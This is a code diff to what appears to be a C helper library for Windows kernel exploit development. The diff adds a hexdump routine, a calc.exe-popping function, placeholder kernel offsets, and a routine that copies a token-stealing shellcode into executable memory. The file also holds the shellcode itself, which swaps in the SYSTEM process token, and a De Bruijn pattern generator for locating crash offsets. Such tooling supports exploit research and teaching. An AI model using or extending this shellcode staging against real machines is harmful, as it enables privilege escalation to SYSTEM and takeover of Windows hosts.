@@ -18,6 +18,10 @@
 BOOL DebugMode = FALSE;
 
 
+DWORD GetPageSize();
+
+
+
 /**
  * Few basic logging functions.
  */
@@ -84,6 +88,42 @@ void perr(char* msg)
                                 ( ( *p == '.' ) || ( *p < 33 ) ) );
 
         err("%s: %s (%d)\n", msg, sysMsg, eNum);
+}
+
+
+VOID hexdump(PVOID data, SIZE_T size)
+{
+        CHAR ascii[17] = {0, };
+        SIZE_T i, j;
+
+        for (i = 0; i < size; ++i) {
+                PVOID ptr = data+i;
+                BYTE c = *((PCHAR)ptr);
+
+                printf("%02X ", c);
+                if (c >= 0x20 && c <= 0x7e) {
+                        ascii[i % 16] = c;
+                } else {
+                        ascii[i % 16] = '.';
+                }
+
+                if ((i+1) % 8 == 0 || i+1 == size) {
+                        printf(" ");
+                        if ((i+1) % 16 == 0) {
+                                printf("|  %s \n", ascii);
+                                ZeroMemory(ascii, sizeof(ascii));
+                        } else if (i+1 == size) {
+                                ascii[(i+1) % 16] = '\0';
+                                if ((i+1) % 16 <= 8) {
+                                        printf(" ");
+                                }
+                                for (j = (i+1) % 16; j < 16; ++j) {
+                                        printf("   ");
+                                }
+                                printf("|  %s \n", ascii);
+                        }
+                }
+        }
 }
 
 
@@ -189,6 +229,13 @@ void PopupCmd()
 }
 
 
+void PopupCalc()
+{
+        PopupNewProcess("c:\\windows\\system32\\calc.exe");
+        return;
+}
+
+
 /**
  * Token stealing helper
  */
@@ -215,13 +262,23 @@ void PopupCmd()
 #define SYSTEM_PID        "\x04"       // 0x04
 #endif
 
-// TODO: get more offsets from others Windows versions
+
+#else
+
+#define KTHREAD_OFFSET    "\x00"
+#define EPROCESS_OFFSET   "\x00"
+#define PID_OFFSET        "\x00"
+#define FLINK_OFFSET      "\x00"
+#define TOKEN_OFFSET      "\x00"
+#define SYSTEM_PID        "\x00"
+
 #endif
 
 
 /**
  * Shellcode source: https://gist.github.com/hugsy/763ec9e579796c35411a5929ae2aca27
  */
+
 const char StealTokenShellcode[] = ""
 #ifdef __X86_64__
         "\x50"                                                      // push rax
@@ -266,6 +323,25 @@ const char StealTokenShellcode[] = ""
         "";
 
 #define StealTokenShellcodeLength sizeof(StealTokenShellcode)
+
+
+PVOID AllocatePageWithShellcode()
+{
+        DWORD dwSize = GetPageSize();
+        LPVOID lpBuf;
+
+        lpBuf = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (!lpBuf){
+                perr("VirtualAlloc failed");
+                return NULL;
+        }
+
+        ZeroMemory(lpBuf, dwSize);
+        CopyMemory(lpBuf, (PVOID)StealTokenShellcode, StealTokenShellcodeLength);
+        RtlFillMemory(lpBuf+StealTokenShellcodeLength, dwSize-StealTokenShellcodeLength, '\xcc');
+
+        return lpBuf;
+}
 
 
 /**
@@ -322,10 +398,6 @@ LPSTR CreateDeBruijnPattern(DWORD dwSize)
 }
 
 
-
-/**
- * System info
- */
 DWORD GetPageSize()
 {
         SYSTEM_INFO siSysInfo;
